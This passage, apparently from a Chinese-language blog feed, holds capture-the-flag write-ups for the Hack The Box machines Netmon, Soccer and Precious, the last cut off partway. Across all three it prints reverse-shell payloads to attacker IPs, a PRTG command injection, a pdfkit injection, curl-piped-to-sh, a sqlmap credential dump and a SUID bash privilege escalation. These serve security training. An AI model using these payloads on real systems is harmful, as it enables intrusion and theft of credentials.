CWD command successful.\nftp> cd paessler\n250 CWD command successful.\nftp> ls\n229 Entering Extended Passive Mode (|||50169|)\n125 Data connection already open; Transfer starting.\n01-07-23  03:24PM       <DIR>          PRTG Network Monitor\n226 Transfer complete.\n```\n\n确实存在\n\n```bash\nftp> cd \"PRTG Network Monitor\"\n250 CWD command successful.\nftp> ls\n229 Entering Extended Passive Mode (|||50179|)\n150 Opening ASCII mode data connection.\n01-07-23  03:24PM       <DIR>          Configuration Auto-Backups\n01-07-23  03:24PM       <DIR>          Log Database\n02-02-19  11:18PM       <DIR>          Logs (Debug)\n02-02-19  11:18PM       <DIR>          Logs (Sensors)\n02-02-19  11:18PM       <DIR>          Logs (System)\n01-07-23  03:24PM       <DIR>          Logs (Web Server)\n01-07-23  03:24PM       <DIR>          Monitoring Database\n02-25-19  09:54PM              1189697 PRTG Configuration.dat\n02-25-19  09:54PM              1189697 PRTG Configuration.old\n07-14-18  02:13AM              1153755 PRTG Configuration.old.bak\n01-07-23  03:24PM              1632703 PRTG Graph Data Cache.dat\n02-25-19  10:00PM       <DIR>          Report PDFs\n02-02-19  11:18PM       <DIR>          System Information Database\n02-02-19  11:40PM       <DIR>          Ticket Database\n02-02-19  11:18PM       <DIR>          ToDo Database\n```\n\n```bash\nftp> get \"PRTG Configuration.old.bak\"\nlocal: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak\n229 Entering Extended Passive Mode (|||50302|)\n125 Data connection already open; Transfer starting.\n  7% |***********                                                                                                                                                           | 88641       86.52 KiB/s    00:12 ETAftp: Reading from network: 被中断的系统调用\n  0% |                                                                                                                                                                      |    -1        0.00 KiB/s    --:-- ETA\n550 The specified network name is no longer available.\n```\n\n获取文件 `Configuration.old.bak` \n\n```bash\ngrep -B5 -A5 -i password RPTG\\ Configuration.dat.bak|sed 's/ //g'|sort -u|less\n```\n\n在该文件中，我们找到了一串疑似密码的玩意儿\n\n```bash\n<proxyport>\n        PrTg@dmin2018\n<retrysnmp>\n        <!--User:prtgadmin-->\n```\n\n![](Hackthebox-Netmon/XWaUj3RLImW_TQncUdzOSIX1wRBPMW06_1yY0DzvHxk.png)\n\n但是拿去 web 页面中登录却又失败了\n\n```bash\n02-25-19  09:54PM              1189697 PRTG Configuration.dat\n02-25-19  09:54PM              1189697 PRTG Configuration.old\n07-14-18  02:13AM              1153755 PRTG Configuration.old.bak\n01-07-23  03:24PM              1632703 PRTG Graph Data Cache.dat\n```\n\n突然想到，这个文件是在 2018 年创建的，那么会不会根据年份变化呢？\n\n```bash\nusername = prtgadmin\npassword = PrTg@dmin2019\n```\n\n去尝试一下\n\n![](Hackthebox-Netmon/5zRmvoP4x-iAY4rFoU_Gu_h2B6WG9lUtWseXIT1hQJo.png)\n\nnice，成功登录\n\n# 权限提升\n\n![](Hackthebox-Netmon/JBVXoM1yH0EdoCa_nlWWFOrAMBo8ohOGe0_kX-S5gjY.png)\n\n在找参考文章和漏洞的时候，倒是遇到个小插曲。这里因为我的节点是俄罗斯的，有一些文章直接无法访问，绝了\n\n> [https://github.com/A1vinSmith/CVE-2018-9276](https://github.com/A1vinSmith/CVE-2018-9276)\n\n合理找到了一个命令注入的漏洞以及利用工具\n\n这个原理是 Netmon 在执行通知脚本时，因为没有执行参数检查而导致的命令注入漏洞\n\n点击 \\`Setup -> Notifications -> Ticket Notification -> Execute Program\n\n![](Hackthebox-Netmon/ySUq7KWmuF5XZxGdmjZ812d5HtABzu1JVHRONiyRtOo.png)\n\n这里就是我们利用的地方\n\n但是在利用之前我们要先做点准备\n\n> [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)\n\n首先使用 nishang 的程序\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .\n```\n\n将我们需要的脚本复制到本地 \n\n```bash\nnc -nvlp 4444\n```\n\n使用 nc 监听一个端口\n\n```bash\nInvoke-PowerShellTcp -Reverse -IPAddress 10.10.16.2 -Port 4444\n```\n\n将上面的语句添加到 `Invoke-PowerShellTcp.ps1` 的最下面\n\n接着将内容转化为 base64\n\n```bash\ncat Invoke-PowerShellTcp.ps1|iconv -t UTF-16LE|base64 -w0\n```\n\n然后构造一下恶意 poc\n\n```bash\ntest|powershell -enc \n```\n\n![](Hackthebox-Netmon/PvqacKVWUcCZ3xa4OZjrljuRjM63PJHY7sMiwJ2Gv4s.png)\n\n![](Hackthebox-Netmon/milOlDsKye0YuuU4dar3MND_jc7Y44EwTISp5BKwnow.png)\n\n然后点击右边的小铃铛运行\n\n```bash\n┌──(root㉿kali)-[/opt/nishang]\n└─# nc -nvlp 4444                                        \nlistening on [any] 4444 ...\nconnect to [10.10.16.2] from (UNKNOWN) [10.10.10.152] 51165\nWindows PowerShell running as user NETMON$ on NETMON\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\Windows\\system32>whoami\nnt authority\\system\n```\n\n成功拿到 system 权限\n\n```bash\nPS C:\\users\\administrator\\desktop> cat root.txt\ne8d8f9949c60a0501831df4efa8613bc\n```\n\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Soccer - Hackthebox","url":"/2022/12/17/Hackthebox/Easy/Hackthebox-Soccer/","content":"\n# Hackthebox - Soccer\n# 靶场信息\n![image](Hackthebox-Soccer/NdsJq-qlcev_gCLGnIBqUmczNDehH9bn3EV9uZBS7ms.png)\n\n# 靶场类型\n![image](Hackthebox-Soccer/NKOV9jOxU2U7YXq-Uooq4eze9eYtmiHglWnxsGN9gDg.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.194\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-12-21 01:38 EST\nNmap scan report for 10.10.11.194\nHost is up (0.28s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE         VERSION\n22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)\n|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)\n|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)\n80/tcp   open  http            nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://soccer.htb/\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n9091/tcp open  xmltec-xmlmail?\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: \n|     HTTP/1.1 400 Bad Request\n|     Connection: close\n|   GetRequest: \n|     HTTP/1.1 404 Not Found\n|     Content-Security-Policy: default-src 'none'\n|     X-Content-Type-Options: nosniff\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 139\n|     Date: Wed, 21 Dec 2022 06:39:07 GMT\n|     Connection: close\n|     <!DOCTYPE html>\n|     <html lang=\"en\">\n|     <head>\n|     <meta charset=\"utf-8\">\n|     <title>Error</title>\n|     </head>\n|     <body>\n|     <pre>Cannot GET /</pre>\n|     </body>\n|     </html>\n|   HTTPOptions: \n|     HTTP/1.1 404 Not Found\n|     Content-Security-Policy: default-src 'none'\n|     X-Content-Type-Options: nosniff\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 143\n|     Date: Wed, 21 Dec 2022 06:39:07 GMT\n|     Connection: close\n|     <!DOCTYPE html>\n|     <html lang=\"en\">\n|     <head>\n|     <meta charset=\"utf-8\">\n|     <title>Error</title>\n|     </head>\n|     <body>\n|     <pre>Cannot OPTIONS /</pre>\n|     </body>\n|     </html>\n|   RTSPRequest: \n|     HTTP/1.1 404 Not Found\n|     Content-Security-Policy: default-src 'none'\n|     X-Content-Type-Options: nosniff\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 143\n|     Date: Wed, 21 Dec 2022 06:39:08 GMT\n|     Connection: close\n|     <!DOCTYPE html>\n|     <html lang=\"en\">\n|     <head>\n|     <meta charset=\"utf-8\">\n|     <title>Error</title>\n|     </head>\n|     <body>\n|     <pre>Cannot OPTIONS /</pre>\n|     </body>\n|_    </html>\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port9091-TCP:V=7.93%I=7%D=12/21%Time=63A2AA05%P=x86_64-pc-linux-gnu%r(i\nSF:nformix,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\\nSF:r\\n\\r\\n\")%r(drda,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\\nSF:x20close\\r\\n\\r\\n\")%r(GetRequest,168,\"HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\nSF:\\nContent-Security-Policy:\\x20default-src\\x20'none'\\r\\nX-Content-Type-O\nSF:ptions:\\x20nosniff\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nC\nSF:ontent-Length:\\x20139\\r\\nDate:\\x20Wed,\\x2021\\x20Dec\\x202022\\x2006:39:07\nSF:\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n<!DOCTYPE\\x20html>\\n<html\\x20lan\nSF:g=\\\"en\\\">\\n<head>\\n<meta\\x20charset=\\\"utf-8\\\">\\n<title>Error</title>\\n<\nSF:/head>\\n<body>\\n<pre>Cannot\\x20GET\\x20/</pre>\\n</body>\\n</html>\\n\")%r(H\nSF:TTPOptions,16C,\"HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Po\nSF:licy:\\x20default-src\\x20'none'\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\\nSF:nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\nSF:\\r\\nDate:\\x20Wed,\\x2021\\x20Dec\\x202022\\x2006:39:07\\x20GMT\\r\\nConnection\nSF::\\x20close\\r\\n\\r\\n<!DOCTYPE\\x20html>\\n<html\\x20lang=\\\"en\\\">\\n<head>\\n<m\nSF:eta\\x20charset=\\\"utf-8\\\">\\n<title>Error</title>\\n</head>\\n<body>\\n<pre>\nSF:Cannot\\x20OPTIONS\\x20/</pre>\\n</body>\\n</html>\\n\")%r(RTSPRequest,16C,\"H\nSF:TTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Policy:\\x20default-\nSF:src\\x20'none'\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nContent-Type:\\x2\nSF:0text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\\r\\nDate:\\x20Wed,\nSF:\\x2021\\x20Dec\\x202022\\x2006:39:08\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\\nSF:n<!DOCTYPE\\x20html>\\n<html\\x20lang=\\\"en\\\">\\n<head>\\n<meta\\x20charset=\\\"\nSF:utf-8\\\">\\n<title>Error</title>\\n</head>\\n<body>\\n<pre>Cannot\\x20OPTIONS\nSF:\\x20/</pre>\\n</body>\\n</html>\\n\")%r(RPCCheck,2F,\"HTTP/1\\.1\\x20400\\x20Ba\nSF:d\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(DNSVersionBindReqTCP,2\nSF:F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")\nSF:%r(DNSStatusRequestTCP,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnec\nSF:tion:\\x20close\\r\\n\\r\\n\")%r(Help,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\\nSF:r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(SSLSessionReq,2F,\"HTTP/1\\.1\\x20400\\\nSF:x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=12/21%OT=22%CT=1%CU=36450%PV=Y%DS=2%DC=T%G=Y%TM=63A2AA\nOS:34%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST\nOS:11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC\nOS:N(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8080/tcp)\nHOP RTT       ADDRESS\n1   279.48 ms 10.10.14.1\n2   280.06 ms 10.10.11.194\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 68.40 seconds\n```\n## Http\n![image](Hackthebox-Soccer/em2pH6JAc_kBsenGVW7JL_3pl4xxQs0b2ui01Yc9uK4.png)\n\n80 端口会跳转到域名 soccer.htb，加入 hosts 解析\n\n```bash\necho 10.10.11.194 soccer.htb >> /etc/hosts\n```\n![image](Hackthebox-Soccer/6ZTLKBThn3pqxuz7Z5ntUU386abNmGyQTA56QC-TRTw.png)\n\n这是一个足球俱乐部，首页面没有什么有用的东西，先做个信息收集吧\n\n```Plain Text\n┌──(root㉿kali)-[~/Desktop]\n└─# ffuf -u \"http://soccer.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://soccer.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\n                        [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 278ms]\ntiny                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 282ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 141 req/sec :: Duration: [0:03:43] :: Errors: 2 ::\n```\n找到个文件夹\n\n![image](Hackthebox-Soccer/LpSVXGrCpqXDt-qLch3WGEeypao2PbqQBK99UF00Rbg.png)\n\n是一个登陆页面\n\n# 漏洞利用\n搜索到了两个默认密码\n\n```Plain Text\nusername = admin\npassword = admin@123\n\nusername = user\npassword = 12345\n```\n![image](Hackthebox-Soccer/OiHXWlpZ_RXCexycn5Ol9CP_kRZIu125CgiLKqyx7xE.png)\n\n得到了版本 2.4.3 去找一下漏洞\n\n![image](Hackthebox-Soccer/sa-ILWhXEaN6GPhK9nqN_eezYBK49DOXeQx4koKNhH0.png)\n\n\n\n在网上找到了一个文件上传的 poc，但怎么都无法执行成功\n\n![image](Hackthebox-Soccer/ksjsat0sX9V54RF97YJygR8IBWNc_sDLQnxVwg7gwok.png)\n\n我们去 uploads 文件夹中自己尝试上传试试\n\n```php\n<?php\n    system(\"bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'\")\n?>\n```\n使用 nc 监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n![image](Hackthebox-Soccer/q0mdrFIF5uJZBaKA73aVI6C3rRsqpH-IASzyuQedKRE.png)\n\n可以看到已经传上去了，点击 open 打开我们的脚本\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nc -nvlp 4444                                       \nlistening on [any] 4444 ...\nconnect to [10.10.14.11] from (UNKNOWN) [10.10.11.194] 37056\nbash: cannot set terminal process group (1039): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@soccer:~/html/tiny/uploads$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n成功得到一个 shell\n\n# 权限提升\n## User\n首先去跑一个 linpea\n\n```bash\ncurl -L http://10.10.14.11/linpeas.sh|sh\n```\n```bash\n══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                                                                \n                              ╚═════════════════════╝                                                                                                                                                              \n╔══════════╣ Hostname, hosts and DNS\nsoccer                                                                                                                                                                                                             \n127.0.0.1       localhost       soccer  soccer.htb      soc-player.soccer.htb\n\n127.0.1.1       ubuntu-focal    ubuntu-focal\n```\n看到还有一个子域名，我们也去加入 hosts 解析\n\n```bash\necho 10.10.11.194 soc-player.soccer.htb >> /etc/hosts\n```\n![image](Hackthebox-Soccer/0Sagg59nUSl4JYtMD7_tS3DC_Oz3bvOZLB3R_w68gyU.png)\n\n这次就要多一些功能了\n\n先去随便注册一个账号吧\n\n![image](Hackthebox-Soccer/j7zmdLsftD8ips2cI7PqnXfbS1sxXmcnWytcGACBdrw.png)\n\n登入后台后貌似是一个验票的功能\n\n```bash\n        var ws = new WebSocket(\"ws://soc-player.soccer.htb:9091\");\n        window.onload = function () {\n```\n在源代码中发现了这个，这里应该是需要利用 ws 了\n\n> [https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)\n\n> 找到了一篇参考文章\n\n使用里面那个脚本，然后把第六行刚改为“ws://soc-player.soccer.htb:9091”\n\n第十五行的内容改为“data = '{\"id\":\"%s\"}' % message”\n\n然后运行\n\n```python\n┌──(root㉿kali)-[~/Desktop]\n└─# python3 sql.py\n[+] Starting MiddleWare Server\n[+] Send payloads in http://localhost:8081/?id=*\n```\n然后使用 sqlmap 跑就行了\n\n```python\n┌──(root㉿kali)-[~/Desktop]\n└─# sqlmap -u \"http://localhost:8081/?id=1\" --batch -D soccer_db -T accounts -C username,password --dump\n\nDatabase: soccer_db\nTable: accounts\n[2 entries]\n+----------+----------------------+\n| username | password             |\n+----------+----------------------+\n| player   | PlayerOftheMatch2022 |\n+----------+----------------------+\n```\n然后使用 ssh 进行登陆\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ssh player@10.10.11.194                        \nplayer@10.10.11.194's password: \nWelcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Wed Dec 21 09:22:10 UTC 2022\n\n  System load:  0.01              Processes:             229\n  Usage of /:   70.0% of 3.84GB   Users logged in:       0\n  Memory usage: 25%               IPv4 address for eth0: 10.10.11.194\n  Swap usage:   0%\n\n\n0 updates can be applied immediately.\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\nLast login: Tue Dec 13 07:29:10 2022 from 10.10.14.19\nplayer@soccer:~$ whoami&&id\nplayer\nuid=1001(player) gid=1001(player) groups=1001(player)\n```\n成功拿到 user 权限\n\n```bash\nplayer@soccer:~$ cat user.txt \nd7452b954047ec61d79b73ddbaeb6302\n```\n成功拿到 user 权限的 flag 文件\n\n## Root\n```bash\nplayer@soccer:~$ find / -perm -4000 2>/dev/null\n/usr/local/bin/doas\n/usr/lib/snapd/snap-confine\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/eject/dmcrypt-get-device\n/usr/bin/umount\n/usr/bin/fusermount\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/chfn\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/chsh\n/usr/bin/at\n/snap/snapd/17883/usr/lib/snapd/snap-confine\n/snap/core20/1695/usr/bin/chfn\n/snap/core20/1695/usr/bin/chsh\n/snap/core20/1695/usr/bin/gpasswd\n/snap/core20/1695/usr/bin/mount\n/snap/core20/1695/usr/bin/newgrp\n/snap/core20/1695/usr/bin/passwd\n/snap/core20/1695/usr/bin/su\n/snap/core20/1695/usr/bin/sudo\n/snap/core20/1695/usr/bin/umount\n/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core20/1695/usr/lib/openssh/ssh-keysign\n```\n寻找 SUID 二进制文件，找到了一个 /usr/local/bin/doas，我们进入路径 /usr/local/\n\n在路径 /usr/local/ 中，除了 /bin/doas 我们还能看到 /etc/doas.conf\n\n```bash\nplayer@soccer:/usr/local/etc$ cat doas.conf \npermit nopass player as root cmd /usr/bin/dstat\n```\n它告诉我们，允许我们以 root 权限运行 /usr/bin/dstat 文件\n\n```bash\nplayer@soccer:/usr/local/share$ ls -la\ntotal 24\ndrwxr-xr-x  6 root root   4096 Nov 17 09:16 .\ndrwxr-xr-x 10 root root   4096 Nov 15 21:38 ..\ndrwxr-xr-x  2 root root   4096 Nov 15 21:39 ca-certificates\ndrwxrwx---  2 root player 4096 Dec 12 14:53 dstat\ndrwxrwsr-x  2 root staff  4096 Nov 17 08:06 fonts\ndrwxr-xr-x  5 root root   4096 Nov 17 09:09 man\n```\n我们在存储插件的 share/dstat/ 目录中有写入权限\n\n那么我们只需要创建一个返回 bash suid 的 python 文件并将其作为插件运行\n\n```bash\ncd /usr/local/share/dstat\necho 'import os;os.system(\"chmod u+s /bin/bash\")' > dstat_privesc.py\ndoas -u root /usr/bin/dstat --privesc &>/dev/null\n```\n然后查看 /bin/bash 文件的权限即可看到已经成功利用上了\n\n```bash\nls -l /bin/bash\n```\n然后使用 /bin/bash -p 进行提权\n\n```bash\nplayer@soccer:/usr/local/share/dstat$ /bin/bash -p\nbash-5.0# whoami&&id\nroot\nuid=1001(player) gid=1001(player) euid=0(root) groups=1001(player)\n```\n成功拿到 root 账户权限\n\n```bash\nbash-5.0# cat /root/root.txt\n1bb7d214069e85a0b01582a7399b7a0b\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Precious - Hackthebox","url":"/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/","content":"\n# Hackthebox - Precious\n# 靶场信息\n![image](Hackthebox-Precious/SXO6XJBr5ubR5mDW_Tg1EF7_AvGQ7AN6uk36u2mK6U0.png)\n\n# 靶场类型\n![image](Hackthebox-Precious/7qptmzhy7gnR3SulQNc5wXHHdbX5mAXwTIdg_y_YUHg.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.189\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-12-31 20:35 EST\nNmap scan report for 10.10.11.189\nHost is up (0.26s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 845e13a8e31e20661d235550f63047d2 (RSA)\n|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)\n|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)\n80/tcp open  http    nginx 1.18.0\n|_http-title: Did not follow redirect to http://precious.htb/\n|_http-server-header: nginx/1.18.0\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=12/31%OT=22%CT=1%CU=35049%PV=Y%DS=2%DC=T%G=Y%TM=63B0E3\nOS:93%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST\nOS:11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC\nOS:N(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 21/tcp)\nHOP RTT       ADDRESS\n1   264.06 ms 10.10.14.1\n2   264.51 ms 10.10.11.189\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 46.32 seconds\n```\n增加一个 hosts 解析\n\n```bash\necho 10.10.11.189 precious.htb >> /etc/hosts\n```\n## Http\n![image](Hackthebox-Precious/yU0h4je2sQ4u_xq4_XsMc4kOm6jFsan6axVWrw012DI.png)\n\n首页就一个功能，将网页转换为 PDF\n\n![image](Hackthebox-Precious/ESUUrIl3cFliJnYLguZJNWDl3uHLwGqeoqyN8DQE9i4.png)\n\n提示无法加载远程 URL，尝试一下本地\n\n![image](Hackthebox-Precious/Htm0c_q1alaWKKxMliXq3Q3Y73S5wgmVoD7gIlWOm68.png)\n\n这里使用 127.0.0.1 和 localhost 都不行，我们本地开一个 http 服务看看是否有请求\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# python3 -m http.server 80                                \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# python3 -m http.server 80                                \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.189 - - [31/Dec/2022 20:41:39] \"GET / HTTP/1.1\" 200 -\n```\n![image](Hackthebox-Precious/GEzZ9J3zDYgiMN6yV8kJ4Ws-GsRxaswc_eaxkncWUdY.png)\n\n确实是有请求，并且成功转换为 pdf文件\n\n```bash\n┌──(root㉿kali)-[~/Downloads]\n└─# exiftool ylm4oxm111sk45cwb57jmfctpy0epjfq.pdf \nExifTool Version Number         : 12.49\nFile Name                       : ylm4oxm111sk45cwb57jmfctpy0epjfq.pdf\nDirectory                       : .\nFile Size                       : 19 kB\nFile Modification Date/Time     : 2022:12:31 20:41:41-05:00\nFile Access Date/Time           : 2022:12:31 20:42:00-05:00\nFile Inode Change Date/Time     : 2022:12:31 20:41:42-05:00\nFile Permissions                : -rw-r--r--\nFile Type                       : PDF\nFile Type Extension             : pdf\nMIME Type                       : application/pdf\nPDF Version                     : 1.4\nLinearized                      : No\nPage Count                      : 1\nCreator                         : Generated by pdfkit v0.8.6\n```\n这里可以看到生成的工具是 pdfkit 0.8.6\n\n# 漏洞利用\n> [https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795)\n\n> [https://www.ctfiot.com/84447.html](https://www.ctfiot.com/84447.html)\n\n> 找到了两份参考文档\n\n首先创建一个 payload\n\n```bash\nhttp://example.com/?name=%20`bash -c 'exec bash -i &>/dev/tcp/10.10.14.84/4444 <&1'`\n```\n然后使用 nc 监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n然后去请求我们的 payload\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.84] from (UNKNOWN) [10.10.11.189] 40412\nbash: cannot set terminal process group (678): Inappropriate ioctl for device\nbash: no job control in this shell\nruby@precious:/var/www/pdfapp$ whoami&&id\nwhoami&&id\nruby\nuid=1001(ruby) gid=1001(ruby) groups=1001(ruby)\n```\n成功反弹回 shell\n\n# 权限提升\n## User\n```bash\nruby@precious:~/.bundle$ pwd    \npwd\n/home/ruby/.bundle\nruby@precious:~/.bundle$ cat config\ncat config\n---\nBUNDLE_HTTPS://RUBYGEMS__ORG/: \"henry:Q3c1AqGHtoI0aXAYFH\"\n```\n在 /home/ruby/.bundle 中有一个 config 文件，里面似乎是 henry 用户的密码\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ssh henry@10.10.11.189  \nThe authenticity of host '10.10.11.189 (10.10.11.189)' can't be established.\nED25519 key 